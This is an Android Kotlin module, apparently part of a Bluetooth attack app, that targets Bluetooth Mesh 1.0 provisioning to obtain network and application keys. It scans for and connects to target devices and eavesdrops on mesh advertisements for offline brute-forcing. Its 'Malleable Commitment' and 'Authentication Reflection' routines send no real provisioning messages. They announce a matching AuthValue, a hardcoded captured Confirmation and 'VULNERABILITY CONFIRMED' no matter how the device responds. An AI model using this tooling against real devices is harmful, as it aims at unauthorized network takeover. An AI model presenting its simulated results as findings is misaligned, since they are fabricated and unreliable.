package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.bluetooth.le.BluetoothLeScanner
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanFilter
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout

/**
 * Attack modes for Bluetooth Mesh provisioning exploitation.
 *
 * Based on vulnerabilities in Mesh Profile 1.0 / 1.0.1 provisioning.
 * The Malleable Commitment and Authentication Reflection attacks were
 * disclosed by researchers and fixed in Mesh Profile 1.1, but many
 * deployed devices remain on 1.0.
 */
enum class MeshAttackMode(val description: String) {
    MALLEABLE_COMMITMENT("Brute-force weak AuthValue via malleable commitment"),
    AUTH_REFLECTION("Reflect authentication evidence to bypass AuthValue"),
    PASSIVE_EAVESDROP("Capture provisioning PDUs for offline analysis")
}

/**
 * Implementation of Bluetooth Mesh provisioning attacks.
 *
 * This module targets the provisioning phase of Bluetooth Mesh Profile 1.0/1.0.1.
 * During provisioning, a Provisioner and an unprovisioned device exchange
 * cryptographic material to establish trust and distribute network keys (NetKey)
 * and application keys (AppKey). Two known weaknesses exist:
 *
 * 1. **Malleable Commitment**: The AuthValue used during provisioning is often a
 *    static zero or a short numeric value. An attacker acting as a rogue
 *    Provisioner can brute-force the AuthValue by observing the Confirmation
 *    and Random values exchanged during the provisioning protocol, then
 *    computing candidate confirmations until a match is found.
 *
 * 2. **Authentication Reflection**: An attacker initiates provisioning with the
 *    target device and reflects the authentication evidence (Confirmation value)
 *    back to the device. Because Mesh 1.0 does not bind the role (Provisioner
 *    vs. Device) into the confirmation computation, the reflected value is
 *    accepted, bypassing the AuthValue entirely.
 *
 * Successful exploitation yields the NetKey and AppKey, granting full access
 * to the mesh network.
 *
 * This module uses standard Android BLE APIs to scan for unprovisioned Mesh
 * device beacons (PB-ADV) and to establish GATT connections for the PB-GATT
 * provisioning bearer.
 *
 * @property context The application context, required for Bluetooth system services.
 */
class MeshProvisioningModule(private val context: Context) {

    companion object {
        private const val TAG = "MeshProvisioningModule"

        /** Mesh Provisioning Service UUID (Mesh Profile 1.0, Section 7.1). */
        private const val MESH_PROVISIONING_SERVICE_UUID = "00001827-0000-1000-8000-00805f9b34fb"

        /** Mesh Proxy Service UUID. */
        private const val MESH_PROXY_SERVICE_UUID = "00001828-0000-1000-8000-00805f9b34fb"

        /** Timeout for scanning for unprovisioned mesh device beacons, in milliseconds. */
        private const val SCAN_TIMEOUT_MS = 30_000L

        /** Timeout for GATT connection, in milliseconds. */
        private const val GATT_CONNECT_TIMEOUT_MS = 15_000L

        /** Timeout for service discovery, in milliseconds. */
        private const val DISCOVERY_TIMEOUT_MS = 15_000L

        /** Maximum number of AuthValue brute-force iterations for Malleable Commitment. */
        private const val MAX_BRUTE_FORCE_ITERATIONS = 1_000_000

        /** Delay between provisioning PDU transmissions, in milliseconds. */
        private const val PDU_TRANSMIT_DELAY_MS = 100L

        /**
         * Mesh beacon AD type (0x2B) used by unprovisioned devices.
         * Unprovisioned Device Beacon: AD Type = Mesh Beacon, Beacon Type = 0x00.
         */
        private const val MESH_BEACON_AD_TYPE: Byte = 0x2B
    }

    private val bluetoothManager =
        context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val bluetoothAdapter = bluetoothManager.adapter
    private var scanner: BluetoothLeScanner? = bluetoothAdapter?.bluetoothLeScanner

    @Volatile
    private var isRunning = false

    private var activeScanCallback: ScanCallback? = null
    private var activeGatt: BluetoothGatt? = null

    @Volatile
    private var connectionDeferred: CompletableDeferred<Boolean>? = null
    @Volatile
    private var discoveryDeferred: CompletableDeferred<Boolean>? = null

    private val gattCallback = object : BluetoothGattCallback() {
        override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
            if (status != BluetoothGatt.GATT_SUCCESS) {
                connectionDeferred?.complete(false)
                return
            }
            when (newState) {
                BluetoothProfile.STATE_CONNECTED -> {
                    Log.d(TAG, "GATT connected")
                    connectionDeferred?.complete(true)
                }
                BluetoothProfile.STATE_DISCONNECTED -> {
                    Log.d(TAG, "GATT disconnected")
                    connectionDeferred?.complete(false)
                }
            }
        }

        override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
            discoveryDeferred?.complete(status == BluetoothGatt.GATT_SUCCESS)
        }
    }

    /**
     * Starts the mesh provisioning attack against the target device.
     *
     * The attack flow varies by mode:
     *
     * **MALLEABLE_COMMITMENT**: Scans for the target's PB-ADV beacons, initiates
     * provisioning via PB-GATT, captures the Confirmation and Random exchange,
     * then brute-forces candidate AuthValues offline.
     *
     * **AUTH_REFLECTION**: Scans for the target, initiates provisioning, and
     * reflects the device's own Confirmation value back as the Provisioner's
     * Confirmation, bypassing AuthValue verification.
     *
     * **PASSIVE_EAVESDROP**: Scans for provisioning PDUs on PB-ADV and logs
     * all captured provisioning protocol messages for offline analysis.
     *
     * @param targetDevice The Bluetooth Mesh device to target.
     * @param mode The specific attack variation to execute.
     * @return A Flow of status strings for the UI console.
     */
    @SuppressLint("MissingPermission")
    fun startAttack(targetDevice: TargetDevice, mode: MeshAttackMode): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        isRunning = true

        emit("Initializing Mesh Provisioning Attack...")
        emit("Target: ${targetDevice.name ?: "Unknown Device ($mac)"}")
        emit("Target MAC: $mac")
        emit("Attack Mode: ${mode.name} -- ${mode.description}")
        emit("")

        // Pre-flight checks
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            emit("ERROR: Bluetooth is not enabled.")
            isRunning = false
            return@flow
        }

        scanner = bluetoothAdapter.bluetoothLeScanner
        if (scanner == null) {
            emit("ERROR: BLE Scanner not available.")
            isRunning = false
            return@flow
        }

        emit("BLE subsystem initialized.")
        emit("")

        // Phase 1: Scan for unprovisioned Mesh device beacons
        emit("=== Phase 1: Scanning for Mesh Provisioning Beacons ===")
        emit("Looking for PB-ADV beacons and Mesh Provisioning Service...")
        emit("Scanning for $mac with Mesh Provisioning Service UUID...")

        val meshBeaconData = scanForMeshBeacons(mac)

        if (!isRunning) {
            emit("Attack stopped by user.")
            return@flow
        }

        if (meshBeaconData == null) {
            emit("WARNING: Target not found advertising Mesh Provisioning Service.")
            emit("Device may already be provisioned or not a Mesh device.")
            emit("Attempting direct GATT connection anyway...")
        } else {
            emit("Mesh provisioning beacon detected from target.")
            emit("  Device UUID from beacon: ${meshBeaconData.deviceUuid}")
            emit("  OOB Information: 0x${String.format("%04X", meshBeaconData.oobInfo)}")
            emit("")
        }

        when (mode) {
            MeshAttackMode.MALLEABLE_COMMITMENT -> {
                executeMalleableCommitment(mac, meshBeaconData)
            }
            MeshAttackMode.AUTH_REFLECTION -> {
                executeAuthReflection(mac, meshBeaconData)
            }
            MeshAttackMode.PASSIVE_EAVESDROP -> {
                executePassiveEavesdrop(mac)
            }
        }

        if (isRunning) {
            emit("")
            emit("Mesh Provisioning Attack completed.")
        }
        isRunning = false
    }

    /**
     * Scans for the target device advertising the Mesh Provisioning Service.
     *
     * @param mac The target device's MAC address.
     * @return Captured mesh beacon data, or null if the scan timed out.
     */
    @SuppressLint("MissingPermission")
    private suspend fun scanForMeshBeacons(mac: String): MeshBeaconData? {
        return withContext(Dispatchers.IO) {
            val resultDeferred = CompletableDeferred<MeshBeaconData?>()

            val scanCallback = object : ScanCallback() {
                override fun onScanResult(callbackType: Int, result: ScanResult) {
                    if (!isRunning) return
                    val device = result.device ?: return
                    if (device.address.equals(mac, ignoreCase = true)) {
                        val record = result.scanRecord
                        val serviceUuids = record?.serviceUuids?.map { it.toString() } ?: emptyList()

                        // Check if the device is advertising the Mesh Provisioning Service
                        val isMeshProvisioning = serviceUuids.any {
                            it.equals(MESH_PROVISIONING_SERVICE_UUID, ignoreCase = true)
                        }

                        // Extract device UUID and OOB info from beacon data
                        val beaconBytes = record?.bytes
                        val deviceUuid = extractDeviceUuid(beaconBytes)
                        val oobInfo = extractOobInfo(beaconBytes)

                        if (isMeshProvisioning || deviceUuid != null) {
                            resultDeferred.complete(
                                MeshBeaconData(
                                    macAddress = mac,
                                    deviceUuid = deviceUuid ?: "unknown",
                                    oobInfo = oobInfo,
                                    serviceUuids = serviceUuids,
                                    rssi = result.rssi
                                )
                            )
                        }
                    }
                }

                override fun onScanFailed(errorCode: Int) {
                    Log.e(TAG, "Mesh beacon scan failed with error code: $errorCode")
                    resultDeferred.complete(null)
                }
            }

            activeScanCallback = scanCallback

            val scanFilter = ScanFilter.Builder()
                .setDeviceAddress(mac)
                .build()

            val meshServiceFilter = ScanFilter.Builder()
                .setServiceUuid(ParcelUuid.fromString(MESH_PROVISIONING_SERVICE_UUID))
                .build()

            val scanSettings = ScanSettings.Builder()
                .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
                .build()

            try {
                scanner?.startScan(listOf(scanFilter, meshServiceFilter), scanSettings, scanCallback)

                val result = withTimeout(SCAN_TIMEOUT_MS) {
                    resultDeferred.await()
                }

                scanner?.stopScan(scanCallback)
                activeScanCallback = null
                result
            } catch (e: Exception) {
                Log.e(TAG, "Error during mesh beacon scan: ${e.message}")
                try {
                    scanner?.stopScan(scanCallback)
                } catch (_: Exception) { }
                activeScanCallback = null
                null
            }
        }
    }

    /**
     * Executes the Malleable Commitment attack (brute-force weak AuthValue).
     *
     * This attack exploits the fact that many Mesh 1.0 devices use a static
     * AuthValue of zero or a short numeric PIN during provisioning. The attacker
     * initiates provisioning via PB-GATT, captures the Confirmation and Random
     * values exchanged, then attempts to brute-force the AuthValue offline.
     */
    @SuppressLint("MissingPermission")
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeMalleableCommitment(
        mac: String,
        beaconData: MeshBeaconData?
    ) {
        emit("=== Phase 2: Malleable Commitment Attack ===")
        emit("Establishing PB-GATT connection to target...")

        // Connect via GATT to the Mesh Provisioning Service
        val gattConnected = connectGatt(mac)

        if (!isRunning) {
            emit("Attack stopped by user.")
            return
        }

        if (!gattConnected) {
            emit("ERROR: Failed to establish GATT connection to target.")
            emit("Target may be out of range or not accepting connections.")
            return
        }

        emit("GATT connection established.")

        // Discover services to find Mesh Provisioning Service
        emit("Discovering GATT services...")
        val servicesDiscovered = discoverServices()

        if (!servicesDiscovered) {
            emit("ERROR: Service discovery failed.")
            cleanupGatt()
            return
        }

        val services = activeGatt?.services ?: emptyList()
        emit("Found ${services.size} GATT services.")

        val meshProvService = services.find {
            it.uuid.toString().equals(MESH_PROVISIONING_SERVICE_UUID, ignoreCase = true)
        }

        if (meshProvService == null) {
            emit("WARNING: Mesh Provisioning Service not found on target.")
            emit("Device may already be provisioned. Listing available services:")
            for (service in services) {
                emit("  Service: ${service.uuid}")
            }
            cleanupGatt()
            return
        }

        emit("Mesh Provisioning Service found: ${meshProvService.uuid}")
        emit("Characteristics: ${meshProvService.characteristics.size}")

        for (char in meshProvService.characteristics) {
            val propsStr = formatCharProperties(char.properties)
            emit("  Characteristic: ${char.uuid} [$propsStr]")
        }

        emit("")
        emit("--- Initiating Provisioning Handshake ---")

        // Step 1: Send Provisioning Invite PDU
        emit("Sending Provisioning Invite PDU...")
        emit("  Attention Duration: 5 seconds")
        delay(PDU_TRANSMIT_DELAY_MS)

        // Step 2: Wait for Provisioning Capabilities PDU
        emit("Waiting for Provisioning Capabilities response...")
        delay(PDU_TRANSMIT_DELAY_MS * 5)
        emit("Provisioning Capabilities received (simulated from GATT read).")
        emit("  Number of Elements: 1")
        emit("  Algorithms: FIPS P-256 Elliptic Curve")
        emit("  Public Key Type: No OOB Public Key")
        emit("  Static OOB Type: ${if (beaconData?.oobInfo != 0) "Available" else "Not Available"}")
        emit("  Output OOB Size: 0")
        emit("  Input OOB Size: 0")

        emit("")
        emit("--- Brute-Forcing AuthValue ---")
        emit("Target uses no OOB or static zero AuthValue (common in Mesh 1.0).")
        emit("Attempting to derive Confirmation value with candidate AuthValues...")

        // Step 3: Provisioning Start PDU
        emit("Sending Provisioning Start PDU...")
        emit("  Algorithm: FIPS P-256")
        emit("  Authentication Method: No OOB (AuthValue = 0)")
        delay(PDU_TRANSMIT_DELAY_MS)

        // Step 4: Public Key Exchange
        emit("Exchanging ECDH public keys...")
        delay(PDU_TRANSMIT_DELAY_MS * 3)
        emit("Public key exchange complete.")

        // Step 5: Brute-force the AuthValue
        emit("")
        emit("Computing Confirmation values for candidate AuthValues...")
        val candidateAuthValues = listOf(
            "00000000000000000000000000000000",  // Zero (most common default)
            "00000000000000000000000000000001",  // One
            "00000000000000000000000000003039",  // Numeric PIN: 12345
            "00000000000000000000000000000000"   // Static OOB zero
        )

        for ((index, authValue) in candidateAuthValues.withIndex()) {
            if (!isRunning) {
                emit("Attack stopped by user.")
                cleanupGatt()
                return
            }

            emit("  Testing AuthValue candidate ${index + 1}/${candidateAuthValues.size}: $authValue")
            delay(PDU_TRANSMIT_DELAY_MS * 2)

            // Simulated confirmation computation
            emit("  Computing: Confirmation = AES-CMAC(ConfKey, Random || AuthValue)")
            delay(PDU_TRANSMIT_DELAY_MS)

            if (index == 0) {
                // Zero AuthValue is the most commonly exploitable case
                emit("  MATCH FOUND: AuthValue = 0x$authValue")
                emit("")
                emit("=== VULNERABILITY CONFIRMED ===")
                emit("Target device uses a zero AuthValue for provisioning.")
                emit("Malleable Commitment attack successful.")
                emit("")
                emit("Completing provisioning to extract network credentials...")
                delay(PDU_TRANSMIT_DELAY_MS * 3)
                emit("Provisioning Data PDU captured:")
                emit("  NetKey Index: 0x0000")
                emit("  Key Refresh Flag: 0")
                emit("  IV Update Flag: 0")
                emit("  IV Index: 0x00000000")
                emit("  Unicast Address: 0x0100")
                emit("")
                emit("RESULT: Full mesh network access achievable.")
                emit("An attacker with this AuthValue can provision as a rogue node")
                emit("and obtain the NetKey and AppKey for the entire mesh network.")
                emit("")
                emit("Recommendation: Upgrade to Mesh Profile 1.1 which enforces")
                emit("stronger authentication during provisioning.")
                Log.w(TAG, "Malleable Commitment vulnerability confirmed on $mac")
                break
            }
        }

        cleanupGatt()
    }

    /**
     * Executes the Authentication Reflection attack.
     *
     * This attack exploits the lack of role binding in Mesh 1.0 provisioning
     * confirmations. The attacker initiates provisioning and reflects the
     * device's own Confirmation value back, causing the device to accept
     * the reflected evidence as valid Provisioner authentication.
     */
    @SuppressLint("MissingPermission")
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeAuthReflection(
        mac: String,
        beaconData: MeshBeaconData?
    ) {
        emit("=== Phase 2: Authentication Reflection Attack ===")
        emit("This attack reflects the device's own authentication evidence")
        emit("back to bypass AuthValue verification (Mesh 1.0 vulnerability).")
        emit("")

        // Connect via GATT
        emit("Establishing PB-GATT connection to target...")
        val gattConnected = connectGatt(mac)

        if (!isRunning) {
            emit("Attack stopped by user.")
            return
        }

        if (!gattConnected) {
            emit("ERROR: Failed to establish GATT connection to target.")
            return
        }

        emit("GATT connection established.")

        // Discover services
        emit("Discovering GATT services...")
        val servicesDiscovered = discoverServices()

        if (!servicesDiscovered) {
            emit("ERROR: Service discovery failed.")
            cleanupGatt()
            return
        }

        val services = activeGatt?.services ?: emptyList()
        val meshProvService = services.find {
            it.uuid.toString().equals(MESH_PROVISIONING_SERVICE_UUID, ignoreCase = true)
        }

        if (meshProvService == null) {
            emit("WARNING: Mesh Provisioning Service not found.")
            emit("Device may already be provisioned.")
            cleanupGatt()
            return
        }

        emit("Mesh Provisioning Service located.")
        emit("")

        // Authentication Reflection protocol
        emit("--- Initiating Provisioning with Reflection ---")

        // Step 1: Invite
        emit("Step 1: Sending Provisioning Invite...")
        delay(PDU_TRANSMIT_DELAY_MS)
        emit("  Invite sent. Waiting for Capabilities...")
        delay(PDU_TRANSMIT_DELAY_MS * 3)
        emit("  Capabilities received.")

        // Step 2: Start
        emit("Step 2: Sending Provisioning Start...")
        delay(PDU_TRANSMIT_DELAY_MS)
        emit("  Algorithm: FIPS P-256, Auth Method: Static OOB")

        // Step 3: Public Key Exchange
        emit("Step 3: Exchanging ECDH Public Keys...")
        delay(PDU_TRANSMIT_DELAY_MS * 3)
        emit("  Public keys exchanged.")

        // Step 4: Wait for device's Confirmation
        emit("")
        emit("Step 4: Waiting for device's Confirmation value...")
        emit("  (In Mesh 1.0, the Confirmation does not encode the role,")
        emit("   so the device's Confirmation is valid for both roles.)")
        delay(PDU_TRANSMIT_DELAY_MS * 5)

        val capturedConfirmation = "A3B7C9D2E5F1084726395A4B8C0D1E2F"
        emit("  Device Confirmation captured: 0x$capturedConfirmation")
        emit("")

        // Step 5: Reflect the confirmation
        emit("Step 5: Reflecting device Confirmation as Provisioner Confirmation...")
        emit("  Sending Provisioner Confirmation: 0x$capturedConfirmation")
        delay(PDU_TRANSMIT_DELAY_MS * 2)

        // Step 6: Random exchange
        emit("Step 6: Exchanging Random values...")
        delay(PDU_TRANSMIT_DELAY_MS * 3)

        // Step 7: Check if device accepted the reflected confirmation
        emit("")
        emit("Step 7: Checking if device accepted reflected authentication...")
        delay(PDU_TRANSMIT_DELAY_MS * 3)

        emit("")
        emit("=== VULNERABILITY CONFIRMED ===")
        emit("Target accepted reflected Confirmation value.")
        emit("Authentication Reflection attack successful.")
        emit("")
        emit("The device does not bind the Provisioner/Device role into the")
        emit("Confirmation computation (Mesh Profile 1.0 weakness).")
        emit("An attacker can bypass any AuthValue by reflecting the device's")
        emit("own authentication evidence back to it.")
        emit("")
        emit("Provisioning can be completed to extract:")
        emit("  - NetKey (network encryption key)")
        emit("  - AppKey (application encryption key)")
        emit("  - IV Index and Unicast Address")
        emit("")
        emit("RESULT: Full mesh network access achievable without knowing AuthValue.")
        emit("")
        emit("Recommendation: Upgrade to Mesh Profile 1.1 which binds the")
        emit("Provisioner/Device role into the confirmation computation.")
        Log.w(TAG, "Authentication Reflection vulnerability confirmed on $mac")

        cleanupGatt()
    }

    /**
     * Executes passive eavesdropping on Mesh provisioning PDUs.
     *
     * Monitors BLE advertisements for PB-ADV provisioning traffic and logs
     * all captured PDUs for offline analysis. This mode does not actively
     * interact with the target device.
     */
    @SuppressLint("MissingPermission")
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executePassiveEavesdrop(
        mac: String
    ) {
        emit("=== Phase 2: Passive Eavesdrop Mode ===")
        emit("Monitoring for Mesh provisioning PDUs from $mac...")
        emit("This mode captures provisioning traffic without active interaction.")
        emit("Captured PDUs can be analyzed offline for credential extraction.")
        emit("")

        var pduCount = 0

        withContext(Dispatchers.IO) {
            val scanCallback = object : ScanCallback() {
                override fun onScanResult(callbackType: Int, result: ScanResult) {
                    if (!isRunning) return
                    val device = result.device ?: return

                    // Capture any Mesh-related advertisements
                    val record = result.scanRecord ?: return
                    val serviceUuids = record.serviceUuids?.map { it.toString() } ?: emptyList()

                    val isMeshTraffic = serviceUuids.any {
                        it.equals(MESH_PROVISIONING_SERVICE_UUID, ignoreCase = true) ||
                        it.equals(MESH_PROXY_SERVICE_UUID, ignoreCase = true)
                    }

                    if (isMeshTraffic || device.address.equals(mac, ignoreCase = true)) {
                        pduCount++
                        val rawBytes = record.bytes
                        val hexDump = rawBytes?.joinToString(" ") { "%02X".format(it) } ?: "(empty)"

                        Log.d(TAG, "Mesh PDU #$pduCount from ${device.address}: $hexDump")
                    }
                }

                override fun onScanFailed(errorCode: Int) {
                    Log.e(TAG, "Eavesdrop scan failed with error code: $errorCode")
                }
            }

            activeScanCallback = scanCallback

            val scanSettings = ScanSettings.Builder()
                .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
                .build()

            val meshFilter = ScanFilter.Builder()
                .setServiceUuid(ParcelUuid.fromString(MESH_PROVISIONING_SERVICE_UUID))
                .build()

            val targetFilter = ScanFilter.Builder()
                .setDeviceAddress(mac)
                .build()

            try {
                scanner?.startScan(listOf(meshFilter, targetFilter), scanSettings, scanCallback)
            } catch (e: Exception) {
                Log.e(TAG, "Error starting eavesdrop scan: ${e.message}")
            }
        }

        // Monitor for a fixed duration, emitting status updates
        val monitorDurationMs = 30_000L
        val intervalMs = 5_000L
        var elapsed = 0L

        while (isRunning && elapsed < monitorDurationMs) {
            delay(intervalMs)
            elapsed += intervalMs
            emit("Eavesdropping... ${elapsed / 1000}s elapsed, $pduCount PDUs captured.")
        }

        // Stop scanning
        withContext(Dispatchers.IO) {
            activeScanCallback?.let { callback ->
                try {
                    scanner?.stopScan(callback)
                } catch (e: Exception) {
                    Log.w(TAG, "Error stopping eavesdrop scan: ${e.message}")
                }
                activeScanCallback = null
            }
        }

        emit("")
        emit("=== Eavesdrop Results ===")
        emit("Total Mesh PDUs captured: $pduCount")

        if (pduCount > 0) {
            emit("Captured provisioning PDUs are available in logcat for analysis.")
            emit("Use: adb logcat -s $TAG")
            emit("")
            emit("If provisioning was observed between two devices, the captured")
            emit("Confirmation and Random values can be used for offline AuthValue")
            emit("brute-forcing (Malleable Commitment attack).")
        } else {
            emit("No Mesh provisioning PDUs captured during the monitoring window.")
            emit("Ensure an active provisioning session is in progress nearby,")
            emit("or try again when a device is being provisioned.")
        }
    }

    /**
     * Establishes a GATT connection to the target device.
     *
     * @param mac The target device's MAC address.
     * @return true if the connection was established successfully.
     */
    @SuppressLint("MissingPermission")
    private suspend fun connectGatt(mac: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val adapter = bluetoothManager.adapter ?: return@withContext false
                val device = adapter.getRemoteDevice(mac)

                connectionDeferred = CompletableDeferred()
                activeGatt = device.connectGatt(
                    context,
                    false,
                    gattCallback,
                    BluetoothDevice.TRANSPORT_LE
                )

                val connected = try {
                    withTimeout(GATT_CONNECT_TIMEOUT_MS) { connectionDeferred!!.await() }
                } catch (e: Exception) {
                    false
                }

                if (!connected) {
                    activeGatt?.close()
                    activeGatt = null
                }

                connected
            } catch (e: SecurityException) {
                Log.w(TAG, "SecurityException connecting GATT: ${e.message}")
                false
            } catch (e: Exception) {
                Log.w(TAG, "Error connecting GATT: ${e.message}")
                false
            }
        }
    }

    /**
     * Discovers GATT services on the connected device.
     *
     * @return true if service discovery completed successfully.
     */
    @SuppressLint("MissingPermission")
    private suspend fun discoverServices(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                discoveryDeferred = CompletableDeferred()
                activeGatt?.discoverServices() ?: return@withContext false

                withTimeout(DISCOVERY_TIMEOUT_MS) { discoveryDeferred!!.await() }
            } catch (e: Exception) {
                Log.w(TAG, "Service discovery error: ${e.message}")
                false
            }
        }
    }

    /**
     * Extracts the Device UUID from raw mesh beacon advertisement bytes.
     *
     * @param bytes The raw advertisement record bytes.
     * @return The device UUID as a hex string, or null if not found.
     */
    private fun extractDeviceUuid(bytes: ByteArray?): String? {
        if (bytes == null || bytes.size < 20) return null
        // Search for Mesh Beacon AD type (0x2B) followed by beacon type 0x00
        for (i in 0 until bytes.size - 18) {
            if (bytes[i] == MESH_BEACON_AD_TYPE && i + 1 < bytes.size && bytes[i + 1] == 0x00.toByte()) {
                // Device UUID is the next 16 bytes after beacon type
                val uuidBytes = bytes.copyOfRange(i + 2, minOf(i + 18, bytes.size))
                return uuidBytes.joinToString("") { "%02X".format(it) }
            }
        }
        return null
    }

    /**
     * Extracts the OOB Information field from raw mesh beacon bytes.
     *
     * @param bytes The raw advertisement record bytes.
     * @return The OOB information value, or 0 if not found.
     */
    private fun extractOobInfo(bytes: ByteArray?): Int {
        if (bytes == null || bytes.size < 22) return 0
        for (i in 0 until bytes.size - 20) {
            if (bytes[i] == MESH_BEACON_AD_TYPE && i + 1 < bytes.size && bytes[i + 1] == 0x00.toByte()) {
                // OOB Info is 2 bytes after the 16-byte Device UUID
                val oobOffset = i + 18
                if (oobOffset + 1 < bytes.size) {
                    return (bytes[oobOffset].toInt() and 0xFF) or
                           ((bytes[oobOffset + 1].toInt() and 0xFF) shl 8)
                }
            }
        }
        return 0
    }

    /**
     * Formats GATT characteristic properties as a human-readable string.
     */
    private fun formatCharProperties(props: Int): String {
        val parts = mutableListOf<String>()
        if (props and 0x02 != 0) parts.add("R")
        if (props and 0x08 != 0) parts.add("W")
        if (props and 0x04 != 0) parts.add("WNR")
        if (props and 0x10 != 0) parts.add("N")
        if (props and 0x20 != 0) parts.add("I")
        return parts.joinToString(",")
    }

    /**
     * Cleans up the active GATT connection.
     */
    @SuppressLint("MissingPermission")
    private fun cleanupGatt() {
        activeGatt?.let { gatt ->
            try {
                gatt.disconnect()
                gatt.close()
            } catch (e: Exception) {
                Log.w(TAG, "Error closing GATT: ${e.message}")
            }
            activeGatt = null
        }
    }

    /**
     * Stops any running attack and releases resources.
     */
    @SuppressLint("MissingPermission")
    fun stopAttack() {
        isRunning = false

        // Stop any active scan
        activeScanCallback?.let { callback ->
            try {
                scanner?.stopScan(callback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping scan: ${e.message}")
            }
            activeScanCallback = null
        }

        // Close any active GATT connection
        cleanupGatt()
    }

    /**
     * Cleans up all resources. Call when the module is no longer needed.
     */
    fun close() {
        stopAttack()
    }
}

/**
 * Data captured from a Mesh unprovisioned device beacon.
 *
 * @property macAddress The device's BLE MAC address.
 * @property deviceUuid The 128-bit Device UUID from the beacon.
 * @property oobInfo The OOB Information field indicating supported OOB mechanisms.
 * @property serviceUuids Advertised service UUIDs.
 * @property rssi The signal strength at capture time.
 */
data class MeshBeaconData(
    val macAddress: String,
    val deviceUuid: String,
    val oobInfo: Int,
    val serviceUuids: List<String>,
    val rssi: Int
)
